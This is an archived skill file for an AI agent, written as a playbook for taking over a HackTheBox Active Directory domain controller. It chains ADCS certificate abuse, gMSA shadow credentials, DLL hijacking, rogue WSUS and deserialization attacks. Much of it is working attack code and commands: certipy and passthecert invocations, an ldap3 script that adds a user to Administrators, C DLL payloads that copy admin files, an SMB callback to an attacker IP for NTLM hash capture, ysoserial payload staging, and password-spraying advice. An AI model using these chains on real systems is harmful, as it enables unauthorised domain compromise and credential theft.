# Archived skill: `htb-ad-dc-gmsa-dll-privesc`

Absorbed into `htb-attack-chain-playbooks` during umbrella-building consolidation. Original SKILL.md body follows.

---

---
name: htb-ad-dc-gmsa-dll-privesc
description: Windows AD Domain Controller privesc via gMSA shadow credentials, ADCS certificate abuse, DLL sideloading/hijacking, and WSUS deserialization (CVE-2025-59287).
version: 1.0.0
author: chillspwn
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [htb, kali, ad, windows, gmsa, adcs, dll-hijack, wsus, privesc, domain-controller]
    related_skills: [kali-arsenal, kali-pentest-explainer-lane, pentest-report-pdf]
---

# Windows AD DC PrivEsc — gMSA / ADCS / DLL Hijack / WSUS

## Trigger

Use this skill when the target is a **Windows Domain Controller** and you have:

- Domain user credentials (password or NTLM hash)
- ADCS (Active Directory Certificate Services) running
- gMSA (Group Managed Service Accounts) in the environment
- WSUS service on port 8530/8531
- Custom services loading DLLs from writable paths
- GenericWrite or other ACL-based privileges over accounts

## Core Attack Chains

```text
Chain 1: ADCS Certificate Abuse (PKINIT)
  domain user → certipy find vulnerable templates → request cert with SAN
  → certipy auth with PFX → get target's TGT + NT hash
  (Requires Client Authentication EKU in template)

Chain 1b: ADCS Certificate Abuse (Schannel / Server Auth EKU)
  user in enrollment group → certreq.exe with SAN in INF file
  → CA issues cert with Server Auth EKU → passthecert.py Schannel LDAP auth
  → LDAP shell as Domain Admin → DCSync / group modification

Chain 2: gMSA Shadow Credentials
  user with GenericWrite on gMSA → certipy shadow auto
  → adds KeyCredential → authenticates → gets gMSA NT hash
  → gMSA in Remote Management Users → WinRM shell

Chain 3: DLL Sideload via Writable Service Path
  low-priv shell → find service loading DLL from C:\ProgramData or writable path
  → identify exported function name from service logs
  → craft native C DLL with full CRT + correct export → drop as zip/dll
  → verify execution identity (may be a domain user, NOT SYSTEM)
  → use execution context for next-stage attack (ADCS, SMB callback, etc.)

Chain 4: Rogue Trusted WSUS (confirmed Logging pattern)
  code exec as IT/enrollment user → ICertRequest COM submits CSR for WSUS hostname
  → CA issues Server Authentication cert for wsus.<domain>
  → attacker injects/controls DNS A record for WSUS hostname
  → rogue WSUS over trusted TLS on 8531
  → DC Windows Update client pulls malicious update and runs it as SYSTEM

Chain 4b: WSUS SOAP/deserialization research path (unproven on Logging)
  SOAP calls may return HTTP 200 but still be inert if payload lands in string fields
  → prove with benign proof-file command before assuming RCE

Combined Chain (Logging box confirmed pattern):
  shadow creds on gMSA → WinRM as gMSA
  → UpdateMonitor DLL hijack → code exec as IT group user
  → read application trace log → recover svc_recovery credential (redacted)
  → certreq/ICertRequest COM from DLL context → ADCS cert for wsus.<domain>
  → DNS dynamic update redirects wsus.<domain> to attacker IP
  → rogue trusted WSUS → DC pulls fake update as SYSTEM
  → add controlled account to Domain Admins → DCSync DA → check all DA desktops for flag
```

## Key Techniques

### 1. ADCS Certificate Abuse with certipy

```bash
# Find vulnerable templates
certipy-ad find -u user@domain -p 'password' -dc-ip <DC_IP> -vulnerable

# Request certificate with SAN (if template allows)
certipy-ad req -u user@domain -p 'password' -ca <CA_NAME> \
  -template <VULN_TEMPLATE> -upn administrator@domain -dc-ip <DC_IP>

# Authenticate with PFX to get TGT + NT hash
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP>
```

**Pitfall**: certipy-ad auth prompts "Overwrite? (y/n)" if ccache exists. Pipe `echo 'y'` or delete the file first.

**Pitfall**: Certificate SAN may contain the *requesting* user's UPN in the Security Extension SID, not the SAN UPN. Always check `certipy-ad auth` output for "Using principal:" to see who you actually authenticate as.

**ESC1 with Server Authentication EKU only** (e.g., UpdateSrv template):
Templates with `Enrollee Supplies Subject = TRUE` but only Server Auth EKU (`1.3.6.1.5.5.7.3.1`) are NOT auto-flagged by certipy but ARE exploitable:
1. The IT group (or whoever has enrollment rights) can request a cert with any SAN UPN
2. `certipy-ad auth -pfx` will fail with "Certificate is not valid for client authentication"
3. **Use passthecert.py** for Schannel LDAP authentication instead of PKINIT:

```bash
# Extract cert and key from PFX
openssl pkcs12 -in toby.pfx -clcerts -nokeys -out toby_cert.pem -password pass:password
openssl pkcs12 -in toby.pfx -nocerts -nodes -out toby_key.pem -password pass:password

# Authenticate via Schannel → LDAP shell as the SAN user (Domain Admin!)
python3 passthecert.py -action ldap-shell \
  -crt toby_cert.pem -key toby_key.pem \
  -domain logging.htb -dc-ip <DC_IP>

# In the LDAP shell, escalate (prefer simpler commands first):
# add_user_to_group <user> Administrators    ← WORKS (no spaces in group name)
# add_user_to_group <user> "Domain Admins"   ← may work, test first
# grant_control DC01$ <your_user>            ← OFTEN BROKEN (parser bug), use raw ldap3 instead
# set_shadow_creds <target>
```

**Pitfall**: passthecert.py LDAP shell uses space-delimited parsing — commands with spaces in arguments may fail with "too many values to unpack". Use simple single-word arguments.

**Pitfall — `grant_control` parser bug**: The `grant_control` command in passthecert.py's ldap-shell has parsing issues that cause it to fail silently or error out. If you need to modify group membership or set DCSync ACEs, **bypass the interactive ldap-shell entirely** and use raw `ldap3` MODIFY_ADD:

```python
#!/usr/bin/env python3
"""Bypass passthecert ldap-shell parser bugs with raw ldap3."""
import ssl
import ldap3
from ldap3 import Server, Connection, Tls, SASL, MODIFY_ADD

target = 'DC01.domain.htb'
cert = '/path/to/user_cert.pem'
key  = '/path/to/user_key.pem'

group_dn = 'CN=Administrators,CN=Builtin,DC=domain,DC=htb'
target_dn = 'CN=target_user,CN=Users,DC=domain,DC=htb'  # or Managed Service Accounts

tls = Tls(local_certificate_file=cert, local_private_key_file=key,
          validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLS_CLIENT)
server = Server(target, port=636, use_ssl=True, tls=tls, get_info=ldap3.ALL)
conn = Connection(server, authentication=SASL, sasl_mechanism='EXTERNAL', auto_bind=True)
print(f'[+] Bound as: {conn.extend.standard.who_am_i()}')

ok = conn.modify(group_dn, {'member': [(MODIFY_ADD, [target_dn])]})
print(f'[+] Modify result: {ok} — {conn.result}')
conn.unbind()
```

**This is the preferred method** when you have a Domain Admin cert but passthecert.py interactive commands fail. Requires `pip3 install ldap3 --break-system-packages` on Kali.

**KEY LESSON (Logging box)**: If you have a cert for a Domain Admin user, DO NOT give up just because PKINIT fails (wrong EKU) and passthecert ldap-shell commands have parser bugs. Try raw ldap3 with Schannel EXTERNAL SASL as a fallback. The Council of AIs independently identified this as the #1 attack path — a Domain Admin cert was sitting in the loot directory for 24+ hours while the team explored WSUS, ForceSync, and DLL hijacks.

**CRITICAL CAVEAT — Schannel auth can silently fail**: On some Windows Server 2019 DCs, ALL Schannel LDAP authentication methods fail even when the cert + key are valid and the user is Domain Admin:
- **SASL EXTERNAL** → `authMethodNotSupported` (DC doesn't support EXTERNAL mechanism)
- **certipy -ldap-shell** → `Failed to authenticate: Server did not return an identity (whoAmI)`
- **passthecert.py ldap-shell** → connects and shows `#` prompt, but `whoami` returns `None`, `search` returns empty — the bind is **anonymous**, not authenticated
- **Raw ldap3 EXTERNAL SASL** → `automatic bind not successful - authMethodNotSupported`

This happens when the DC's Schannel configuration doesn't map Server Auth EKU certs to AD identities. The cert must have **Client Authentication EKU** (`1.3.6.1.5.5.7.3.2`) for reliable Schannel mapping. Server Auth EKU (`1.3.6.1.5.5.7.3.1`) works for TLS server identity but NOT for client certificate authentication on all DCs.

**When Schannel fails, fall back to**: WSUS CVE-2025-59287 (if WSUS is present), ForceSync/service dependency hijacking, or finding a way to get a cert with Client Auth EKU.

**Getting passthecert.py**:
```bash
curl -sL https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py -o passthecert.py
```

**In-context cert request via DLL** (when you have code execution as a user with enrollment rights but no password):
Use `certreq.exe` from inside a DLL's exported function. Write an INF file with the SAN, submit via `-attrib "CertificateTemplate:VulnTemplate"`, accept, then export as PFX with `certutil -user -exportpfx`. See DLL Hijack Step 7 for the code pattern.

### 2. gMSA NT Hash via Shadow Credentials

When you have **GenericWrite** over a gMSA but can't read `msDS-ManagedPassword`:

```bash
# Shadow credentials: add a key credential, authenticate, get hash
export KRB5CCNAME=/root/svc_recovery.ccache
echo 'y' | certipy-ad shadow auto \
  -u 'svc_recovery@domain' -k -no-pass \
  -account 'msa_health$' \
  -dc-ip <DC_IP> -target DC01.domain
```

This outputs: `NT hash for 'msa_health$': <hash>` and auto-cleans the KeyCredential.

**Pitfall**: Do NOT try to modify `msDS-GroupMSAMembership` directly via LDAP — the security descriptor format is strict and returns `constraintViolation`. Shadow credentials is the reliable path.

**Pitfall**: svc_recovery in Protected Users group → NTLM auth fails (`STATUS_ACCOUNT_RESTRICTION`). Must use Kerberos (`--use-kcache` or `-k`).

### 3. WinRM Shell — Evil-WinRM vs nxc

**Evil-WinRM v3.9 on Kali has a Ruby crash**: `undefined method 'empty?' for nil` when connecting with NTLM hash to gMSA accounts. Use nxc instead:

```bash
# Execute PowerShell commands via nxc (use -X for PowerShell, not -x for cmd)
nxc winrm DC01.domain -u 'msa_health$' -H '<NT_HASH>' \
  -X 'whoami; hostname; whoami /priv'

# PowerShell uses semicolons, not && for command chaining
# Use -X (PowerShell) not -x (cmd) for gMSA accounts
```

**Pitfall**: pypsrp Kerberos auth fails with "Server not found in Kerberos database" even with valid HTTP SPN in ccache. This is a library-level issue. Use the NT hash with nxc NTLM auth instead.

### 4. DLL Hijack — Critical Details

When a service loads a DLL from a writable path:

**Step 0: ALWAYS verify execution identity first**
The service may NOT run as SYSTEM. A .NET scheduled task or service can run as any domain user. Build a minimal proof-of-concept DLL that writes `GetUserNameA()` output to a writable location BEFORE building the real payload. This avoids hours of debugging a "broken" DLL when the real issue is trying to read Administrator files from a non-admin context.

**Step 1: Identify the target function**
```
# Check monitor/service logs for the function name it expects
# Example: "'PreUpdateCheck' not found in settings_update.dll"
```

**Step 2: Match architecture**
- Error code **193** = "not a valid Win32 application" = **wrong architecture** (x64 DLL loaded by x86 process or vice versa)
- Error code **126** = DLL not found / dependency missing
- .NET MSIL apps (`ProcessorArchitecture: MSIL`) may run as 64-bit on x64 OS even if PE header shows x86. Try both architectures.

**Step 3: Export the correct function name**
```c
// WRONG — DllMain alone is NOT enough if service calls a named export
BOOL APIENTRY DllMain(...) { system("cmd /c ..."); }

// RIGHT — export the exact function the service looks for
#include <windows.h>
#include <stdio.h>  // CRITICAL: include C runtime headers

__declspec(dllexport) void PreUpdateCheck(void) {
    // C runtime fopen/fprintf works reliably when CRT is linked
    FILE *f = fopen("C:\\ProgramData\\UpdateMonitor\\Logs\\proof.txt", "w");
    if (f) {
        fprintf(f, "DLL executed\n");
        fclose(f);
    }
    // CopyFile for flag extraction
    CopyFileA("C:\\Users\\Administrator\\Desktop\\root.txt",
              "C:\\ProgramData\\UpdateMonitor\\Logs\\root.txt", FALSE);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```

**Step 4: Cross-compile WITH FULL C RUNTIME (critical)**

⚠️ **ROOT CAUSE OF SILENT DLL FAILURES**: mingw DLLs compiled with `-nostdlib` or without linking the C runtime will load, have their exported function called, but ALL Win32 API calls (`CreateFileA`, `CopyFileA`, `WriteFile`, etc.) silently return failure. The C runtime initialization in `DllMainCRTStartup` sets up the import address table — without it, kernel32 function pointers are NULL.

```bash
# CORRECT — full CRT linked (produces 80-90KB DLL, which is normal)
i686-w64-mingw32-gcc -shared -o payload.dll payload.c -Wl,--add-stdcall-alias

# WRONG — tiny DLL (2-28KB) = CRT not linked = API calls silently fail
i686-w64-mingw32-gcc -shared -nostdlib -o payload.dll payload.c -lkernel32

# For 64-bit:
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c

# Verify export exists (both plain and stdcall-decorated)
i686-w64-mingw32-objdump -p payload.dll | grep "PreUpdateCheck"
# Should show: PreUpdateCheck AND PreUpdateCheck@0
```

**Step 5: Write to the service's own directory, NOT C:\Windows\Temp**
Services may have restricted write access to system directories. The service's own data directory (e.g., `C:\ProgramData\UpdateMonitor\Logs\`) is always writable by the service identity.

**Step 6: SMB callback for credential capture**
If you need to capture the service user's NTLMv2 hash (for cracking or relay):
```c
__declspec(dllexport) void PreUpdateCheck(void) {
    WIN32_FIND_DATAA fd;
    // Forces NTLM auth to your Responder/ntlmrelayx
    HANDLE h = FindFirstFileA("\\\\10.10.14.150\\share\\test.txt", &fd);
    if (h != INVALID_HANDLE_VALUE) FindClose(h);
}
```
Run `responder -I tun0` to capture the hash.

**Step 7: certreq.exe for in-context certificate requests**
When `system()` fails but `CreateProcessA` works, use `certreq.exe` to request ADCS certs as the service user:
```c
STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
// Generate CSR
CreateProcessA(NULL, "certreq.exe -new -f C:\\path\\req.inf C:\\path\\req.csr",
               NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
WaitForSingleObject(pi.hProcess, 30000);
// Submit to CA
CreateProcessA(NULL, "certreq.exe -submit -attrib \"CertificateTemplate:VulnTemplate\" "
               "-config \"DC01\\CA-Name\" C:\\path\\req.csr C:\\path\\cert.cer",
               NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
WaitForSingleObject(pi.hProcess, 30000);
// Accept cert (merges with private key)
CreateProcessA(NULL, "certreq.exe -accept C:\\path\\cert.cer", ...);
// Export as PFX
CreateProcessA(NULL, "certutil -user -exportpfx -p \"password\" my CN C:\\path\\out.pfx", ...);
```

**Pitfall**: `system()` and `WinExec()` fail silently in .NET-hosted DLL contexts. Use `CreateProcessA` with `CREATE_NO_WINDOW` instead.

**Pitfall**: Verify `root.txt` actually exists at the expected path before building the payload. Use the shell you have to check `Test-Path` first.

**Pitfall**: .NET apps use `LoadLibrary` + `GetProcAddress` via P/Invoke — this calls the native export but does NOT load .NET assemblies. A .NET DLL will show "'PreUpdateCheck' not found" because .NET methods are not native exports. You MUST use a native C DLL.

### 5. WSUS Paths — distinguish inert SOAP from real update-client execution

**Confirmed Logging lesson**: the successful WSUS route was not `ReportEventBatch` deserialization. The correct privileged boundary was the DC's own Windows Update Agent trusting `https://wsus.<domain>:8531`, pulling content from a rogue WSUS server, and installing an attacker-supplied update as SYSTEM. If you control both DNS for the WSUS hostname and a trusted Server Authentication certificate for that hostname, prioritize rogue WSUS over repeated SOAP payload tuning.

**Rogue trusted WSUS checklist**:
1. Read WSUS policy: `HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate` for `WUServer` / `WUStatusServer`.
2. Confirm hostname and port, especially HTTPS `8531`.
3. Obtain a trusted TLS cert for the exact WSUS hostname (ADCS Server Auth EKU is sufficient for server identity).
4. Add/modify DNS so the WSUS hostname resolves to the attacker listener.
5. Start rogue WSUS tooling with the issued cert/key.
6. Wait for or trigger the DC Windows Update client; use benign proof action first.
7. After SYSTEM proof, perform the minimal privileged action and clean up DNS/cert/listener artifacts.

**ICertRequest COM bypass pattern**: if a template appears machine-gated in normal client tooling, try submitting the CSR through `ICertRequest` COM from a user that has enrollment rights. On Logging, the CA validated enrollment rights and issued the cert even though the intended machine-context check was client-side.

The older SOAP/deserialization research path requires a BinaryFormatter payload from ysoserial.net:

```bash
# ysoserial.exe CANNOT run on Linux/Mono — TextFormattingRunProperties
# depends on PresentationCore (WPF). Generate payload ON the target:

# Upload full ysoserial release (not just .exe — needs NDesk.Options.dll etc.)
zip -r ysoserial_full.zip .
# Upload via WinRM + Invoke-WebRequest
nxc winrm DC01 -u user -H hash -X '
  Invoke-WebRequest -Uri "http://<LHOST>:9090/ysoserial_full.zip" \
    -OutFile "C:\Windows\Temp\yso.zip"
  Expand-Archive "C:\Windows\Temp\yso.zip" "C:\Windows\Temp\yso" -Force
'

# Generate payload on target
nxc winrm DC01 -u user -H hash -X '
  C:\Windows\Temp\yso\ysoserial.exe \
    -g TextFormattingRunProperties -f BinaryFormatter \
    -c "cmd /c whoami > C:\Windows\Temp\proof.txt" -o base64
'
```

**WSUS client config matters**: Check `HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate` for `WUServer`. If set to HTTPS (8531), the HTTP endpoint (8530) may accept SOAP calls but reject events because the client isn't registered via HTTP.

## Enumeration Checklist on a DC

```powershell
# Groups and memberships
whoami /groups
Get-ADGroupMember "Domain Admins" | Select Name

# gMSA accounts
Get-ADServiceAccount -Filter * -Properties *

# WSUS config
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"

# Writable service paths
icacls "C:\ProgramData\*" /T 2>$null | findstr /I "Users Everyone"

# Scheduled tasks / services as SYSTEM
schtasks /query /fo CSV /v | findstr SYSTEM
```

## WinRM Throttling — CRITICAL

Windows Server 2019 DCs have aggressive WinRM throttling. Opening 3-5 connections in quick succession causes ALL subsequent connections to hang indefinitely (connection established but no command execution). This can persist for 5-15 minutes.

**Rules:**
1. NEVER open more than 1 WinRM session at a time
2. ALWAYS close sessions with `exit` before opening a new one
3. Wait at least 10 seconds between sessions
4. If WinRM hangs, STOP — do NOT retry, wait 2+ minutes
5. If throttled beyond recovery, the box must be reset (HTB) or the WinRM service restarted (real engagement)
6. For file uploads via evil-winrm heredoc + base64: keep the base64 string under ~50KB. Larger strings timeout. Compile DLLs with `-Os -s` and link only needed libraries to minimize zip size.
7. Use `nxc smb` for enumeration (shares, auth checks) instead of WinRM where possible — SMB is more resilient.

## Clock Skew — VM Environments

When the Kali VM's hypervisor controls the system clock:
- `ntpdate`, `date -s`, `timedatectl set-time` all appear to work but the clock snaps back immediately
- `faketime` may not work in containerized/VM environments (`sem_open: File exists`)
- **KRB5_CONFIG clockskew setting only affects the CLIENT** — the KDC still enforces its own 5-minute window
- **Solution**: Use Schannel (LDAPS with client cert) instead of Kerberos for LDAP operations. Schannel doesn't check Kerberos timestamps.
- For PKINIT: you need the system clock within 5 minutes of the DC. If you can't fix the clock, use a previously obtained ccache/TGT (if still valid) or bypass Kerberos entirely.

## Pitfalls Summary

- Evil-WinRM v3.9 crashes with gMSA `$` accounts — use `nxc winrm -X` instead
- pypsrp Kerberos auth broken for gMSA — use NTLM hash via nxc
- Protected Users group blocks NTLM — must use Kerberos for those accounts
- `STATUS_ACCOUNT_RESTRICTION` for ALL passwords = account in Protected Users (not a correct password signal)
- DLL architecture mismatch = error 193 — always check if service is 32/64-bit
- **DLL compiled without CRT = silent API failures** — full CRT must be linked (80-90KB DLL is normal, 2-28KB means CRT is missing)
- DllMain alone insufficient — services call specific named exports via `GetProcAddress`
- .NET DLL shows "not found" for exports — use native C DLL, not managed assembly
- `system()` fails in .NET-hosted DLL contexts — use `CreateProcessA` with `CREATE_NO_WINDOW`
- Service may NOT run as SYSTEM — always verify identity with `GetUserNameA()` before targeting admin files
- `C:\Windows\Temp` may be write-restricted from service context — write to service's own data directory
- ysoserial.exe needs full .NET Framework + WPF — generate payloads on Windows target, not Kali
- Always verify flag file path exists before building payload around it
- WSUS ReportEventBatchResult=false doesn't mean the server is unpatched — check auth cookie scope and client registration
- **WSUS exploit reaches server but gadget doesn't execute**: All 4 SOAP steps succeed (GetRollupConfiguration, GetAuthorizationCookie, GetCookie, ReportEventBatch), HTTP 200 returned, but no command execution side effects (proof files not created, groups not modified). **ROOT CAUSE (confirmed May 2026)**: The current exploit places an XML-escaped SOAP/DataSet envelope as a **string value** inside `ExtendedData/MiscData`. WSUS ReportEventBatch stores MiscData strings in the WID database via SQL INSERT — they are NEVER deserialized. The `DataSet` wrapper only triggers deserialization when .NET's `SoapFormatter.Deserialize()` is called on the stream, which doesn't happen for string-typed SOAP elements. `ReportEventBatchResult=false` means event storage failed (WID memory), NOT that deserialization occurred. **Fix requires changing the injection point** (different SOAP field, different endpoint, or unescaped typed object instead of string), NOT the command string. **Always run a proof-file command first** before the real payload to confirm RCE actually fires.
- ADCS templates with Server Auth EKU block PKINIT but NOT Schannel LDAP auth via passthecert.py
- **CA overrides requested EKU**: even if INF has `OID=1.3.6.1.5.5.7.3.2` (Client Auth) in `[EnhancedKeyUsageExtension]`, the CA issues the cert with the TEMPLATE's EKU (Server Auth). You cannot change the EKU via certreq.
- **Schannel auth may be anonymous or unsupported**: passthecert.py connects and shows LDAP shell prompt but `search` returns empty and `whoami` returns `None` = the bind is unauthenticated. This happens when the cert has Server Auth EKU only — the DC doesn't map it to an AD identity. SASL EXTERNAL may also return `authMethodNotSupported` entirely. **Server Auth EKU certs are NOT reliable for Schannel client auth** despite what the Council of AIs and many writeups suggest. The cert needs Client Authentication EKU for guaranteed Schannel identity mapping.
- passthecert.py LDAP shell has basic argument parsing — avoid spaces in args
- `certreq.exe` works from DLL CreateProcessA context even when `system()` fails
- **certreq in service/session 0 context**: `certreq -new` cannot create RSA key pairs when running as a service (no user profile loaded). The command hangs or produces 0-byte output. Even with `-q` flag, it fails silently. Use `CreateProcessA` with a batch file that runs `certreq` commands sequentially — but be aware the 3-minute UpdateMonitor cycle may kill long-running processes.
- **certreq overwrite prompts**: `certreq -new` prompts "Do you wish to overwrite?" if output files exist, hanging in non-interactive contexts. Delete old `.req`/`.cer`/`.rsp` files first, or use `-f` flag (which may not suppress all prompts in session 0).
- **Credential harvesting from log files**: Check `C:\Share\Logs\`, `C:\ProgramData\*\Logs\`, and similar shared log directories for plaintext credentials in application trace logs (e.g., `IdentitySync_Trace_*.log` containing `BindUser`/`BindPass` in VERBOSE/TRACE output).
- **ALWAYS spray recovered passwords against ALL domain accounts**: When you find a cleartext password (from logs, configs, memory dumps), don't just use it for the account it was associated with. HTB boxes commonly reuse passwords across accounts. Test it against Administrator, all DA accounts, and other service accounts immediately. This is a 30-second check that can skip hours of complex exploitation.
- **Do not over-interpret `STATUS_ACCOUNT_RESTRICTION` during sprays**: For Administrator/DA accounts, SMB `STATUS_ACCOUNT_RESTRICTION` or LDAP data `52f` is not a confirmed password hit, but it is also not the same as `STATUS_LOGON_FAILURE`/LDAP `52e`. If the account may be in Protected Users or has NTLM restrictions, immediately validate the candidate via Kerberos `getTGT` + `nxc winrm -k --use-kcache`. If Kerberos returns `KDC_ERR_PREAUTH_FAILED`, treat the password as wrong despite the SMB restriction signal; if a ccache is created, then test WinRM with Kerberos only. See `references/credential-reuse-and-handoff-notes.md`, `references/logging-round3-connectivity-and-council.md`, and `references/logging-round4-vpn-and-failed-privesc-verification.md`.
- **ForceSync / protected scheduled task windows**: A writable script path is not enough if the protected scheduled task's natural time-trigger window is inactive or expired. First prove liveness with TaskScheduler Operational events (`107`, `100/200`, `201/102`) or fresh execution artifacts. If staging a test payload into a task-consumed script, preserve the original SHA256/content and restore it immediately after a negative result. On Logging, staging `hunt_jaylee.ps1` outside the active ForceSync window produced no artifacts; the useful lesson was trigger-window dependence, not another script-replacement retry. See `references/logging-round4-vpn-and-failed-privesc-verification.md`.
- **HTB VPN verification before resuming old handoffs**: When a handoff says the VPN dropped, validate `tun0`, route selection, TCP service reachability, and one known auth path before continuing exploitation. ICMP can be misleading; route-to-LAN (`via 192.168.x.x`) means the HTB path is down even if commands appear syntactically correct.
- **ESC10 (UPN swap) attack path**: If a user has code execution (e.g., DLL hijack as jaylee) and the "User" cert template has Client Auth EKU + Domain Users enrollment: (1) change own UPN to `administrator@domain` or `targetDA@domain`, (2) request cert from "User" template, (3) revert UPN, (4) PKINIT with the cert authenticates as the target. Key prerequisite: target's UPN must not already be set (built-in Administrator often has no UPN). Target toby-style DAs who are NOT in Protected Users for best results.
- **Performance Log Users → SYSTEM**: If a compromised user is in Performance Log Users, they can register custom performance counter DLLs that execute as LOCAL SYSTEM via `logman create counter` + custom perf extension registration. Known privesc path (itm4n research). Check group membership in BloodHound before dismissing a user as "not admin". If you already have a custom DLL-loader primitive as that user, first deploy a telemetry DLL in the real loader context, confirm `BUILTIN\\\\Performance Log Users` in `whoami /all`, then run a benign `logman`/performance-counter proof that writes `whoami` to a service-writable log path before doing any privileged action.
- **Performance Log Users proof design**: Prefer a combined native-C DLL cycle: (1) run a benign `logman create alert` / Data Collector Set proof that writes `whoami /all` plus per-step status under a service-writable log directory, and (2) collect backup-path readiness facts such as Administrator-run script ACLs/hashes/liveness. Treat `Access is denied`, missing proof files, or proof files showing the low-priv user as failure signals. On Server 2019, `logman create alert` uses `-targ` for task arguments; `-ta` is wrong. `logman create counter ... -rc <action.cmd>` can still fail with `Access is denied` despite Performance Log Users membership, so do not burn time repeatedly adjusting syntax once a benign proof fails. See `references/logging-round4-performance-log-users.md` and `references/logging-round4-vpn-and-failed-privesc-verification.md`.
- **32-bit DLL / Sysnative nuance**: From a 32-bit service-loaded DLL on 64-bit Windows, launch the outer shell as `C:\Windows\Sysnative\cmd.exe` so WOW64 does not redirect to `SysWOW64`. Once that 64-bit shell is running, inner tool paths should normally be `C:\Windows\System32\logman.exe`, `certutil.exe`, `wevtutil.exe`, etc.; `Sysnative` is only a 32-bit-process alias and can fail from the 64-bit child. Log stdout/stderr for every step under the service-writable directory.

## References

- `references/logging-ad-chain-notes.md` — session-specific notes from Logging box (updated session 2: clock skew, WinRM throttling, certreq session 0 failures, credential discovery in logs)
- `references/schannel-auth-failure-modes.md` — detailed Schannel LDAPS authentication failure modes observed on Windows Server 2019: SASL EXTERNAL unsupported, certipy no identity, passthecert anonymous bind. Root cause: Server Auth EKU ≠ Client Auth for Schannel client cert mapping.
- `references/round2-council-vectors.md` — Fresh attack vectors from Round 2 Council of AIs (May 2026): ForceSync dependency hijack via jaylee writable bin\, ESC10 UPN swap with User template (Client Auth EKU), Performance Log Users → SYSTEM via perfmon DLL loading.
- `references/logging-round3-connectivity-and-council.md` — Logging Round 3 notes: HTB VPN candidate validation via route/TCP not ICMP, Administrator `STATUS_ACCOUNT_RESTRICTION` vs Kerberos `KDC_ERR_PREAUTH_FAILED`, and council consensus on ForceSync/Jaylee telemetry, WSUS gadget placement, Performance Log Users, and ESC10 prechecks.
- `references/logging-round3-lane-results.md` — concise lane-result reference: native C `PreUpdateCheck()` telemetry as Jaylee, TaskCache access denied, WSUS ClientDiagnostics negative proof, ESC10 no-go prerequisites, and Performance Log Users as the next SYSTEM proof path.
- `references/logging-round4-performance-log-users.md` — combined proof pattern after council consensus: test `Performance Log Users -> logman/Data Collector Set -> SYSTEM` first, while collecting ForceSync script ACL/hash/liveness in the same native DLL cycle before any hijack.
- `references/logging-round4-vpn-and-failed-privesc-verification.md` — Round 4 negative-proof notes: VPN/tun0 verification, Performance Log Users/logman denial on Server 2019, Sysnative-vs-System32 path nuance, inactive ForceSync trigger window, Administrator Kerberos reuse failures, and WSUS proof-file failure.
- `references/credential-reuse-and-handoff-notes.md` — reusable notes for spraying recovered service passwords, validating `STATUS_ACCOUNT_RESTRICTION` with Kerberos, and saving concise Markdown handoffs before context resets.
- `references/logging-confirmed-rogue-wsus-chain.md` — final Logging chain: UpdateMonitor DLL → ICertRequest COM ServerAuth cert for WSUS hostname → DNS injection → rogue trusted WSUS → DC Windows Update client executes update as SYSTEM.
- `references/logging-final-adcs-rogue-wsus-chain.md` — corrected final class pattern for WSUS+ADCS DCs: gMSA shadow creds → updater DLL as IT user → trace-log credential discovery → ICertRequest COM cert for WSUS hostname → DNS injection → rogue WSUS SYSTEM execution → DCSync/check all DA desktops.
- `templates/dll_hijack_template.c` — proven DLL hijack C template with full CRT, multiple payload options (file copy, identity check, SMB callback, subprocess via CreateProcessA). Includes compilation commands for minimal-size builds suitable for WinRM base64 upload.
- `templates/adcs_san_request.inf` — certreq.exe INF template for ADCS ESC1 cert request with custom SAN UPN. Documents that CA overrides requested EKU and SAN must go in [Extensions] not [RequestAttributes].
